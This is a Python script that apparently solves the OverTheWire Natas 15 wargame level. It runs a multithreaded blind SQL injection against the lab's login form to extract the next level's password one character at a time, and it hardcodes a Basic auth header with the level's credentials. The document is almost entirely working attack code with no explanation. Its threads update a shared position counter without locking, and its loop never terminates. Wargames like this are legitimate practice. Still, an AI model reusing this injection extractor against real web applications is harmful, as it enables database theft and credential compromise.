#!/usr/bin/env python3
import threading
import requests as req
from requests.auth import HTTPBasicAuth
import re

inputs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
password = ''
headers = {
    "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="

}
x = 1

def payload_function():
    global x,inputs,password,headers

    for i in range(len(inputs)):
        payload = 'natas16\" and SUBSTRING(password, ' + str(
            x) + ', 1) LIKE BINARY \"%' + inputs[i] + '%\"#'
        # print(payload)
        data = {
            "username": payload
        }
        url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
        res = req.post(url, headers=headers, data=data)
        pattern = re.compile(r'exists')
        result = pattern.findall(res.text)
        # print(inputs[i])
        if(len(result) > 0):
            password = password + inputs[i]
            print(payload)
            print(password)
            break
    x=x+1

while True:
    threads = []

    for _ in range(10):
        p = threading.Thread(target=payload_function)
        p.start()
        threads.append(p)

    for thread in threads:
        thread.join()
        
